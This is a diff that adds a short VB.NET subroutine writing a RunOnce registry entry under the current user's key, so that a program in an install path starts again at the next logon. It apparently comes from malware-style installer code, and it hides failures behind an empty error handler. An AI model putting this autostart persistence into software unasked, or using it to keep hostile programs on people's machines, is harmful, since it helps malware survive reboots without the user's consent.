@@ -1,0 +1,10 @@
+﻿Sub InstallOnce()
+        Try
+            Dim i As Integer = 0
+            For i = 0 To 100
+                If Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\RunOnce", True).GetValue(startname) Is Nothing Then
+                    Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\RunOnce", True).SetValue(startname, installpath & "\" & sname)
+                End If
+            Next
+        Catch : End Try
+End Sub
